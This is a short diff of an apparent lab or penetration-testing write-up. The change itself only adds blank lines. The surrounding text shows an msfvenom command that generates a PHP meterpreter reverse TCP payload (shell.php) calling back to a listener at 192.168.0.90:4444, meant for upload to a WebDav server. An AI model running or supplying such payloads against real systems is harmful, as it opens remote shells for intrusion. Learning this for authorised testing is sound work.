@@ -140,9 +140,11 @@ Results:
 Once a list of payloads is output and the PHP specific reverse tcp script is found the payload can be created.
 
 Command:
+
 `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.90 LPORT=4444  > shell.php`
 
 Results:
+
 A file called shell.php is now created/in root and ready to move to upload to WebDav server.
 
 ![MSFvenom reverse tcp script](/Images/shell-payload.png "MSFvenom reverse tcp script")
